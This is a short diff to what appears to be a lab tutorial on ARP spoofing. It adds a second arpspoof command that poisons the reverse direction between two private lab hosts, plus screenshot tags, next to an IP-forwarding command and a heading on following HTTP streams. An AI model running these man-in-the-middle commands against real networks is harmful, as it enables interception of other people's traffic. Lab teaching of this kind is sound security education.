@@ -148,6 +148,8 @@ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 Terminal 1 & 2:
 
 sudo arpspoof -i eth0 -t 192.168.244.128 192.168.244.131
+& 
+sudo arpspoof -i eth0 -t 192.168.244.131 192.168.244.128
 <br>
 <br>
 <img width="3393" height="1911" alt="Image" src="https://github.com/user-attachments/assets/47ca151c-a8f2-4360-82ad-a1baad094872" />
@@ -170,9 +172,10 @@ You will see:
 - Packet interception
 
 Screenshots :
-
-
-
+<br>
+<br>
+<img width="3018" height="1902" alt="Image" src="https://github.com/user-attachments/assets/76f46da3-1e22-474b-8846-a869da672530" />
+<br>
 ---
 
 ## Follow HTTP Stream
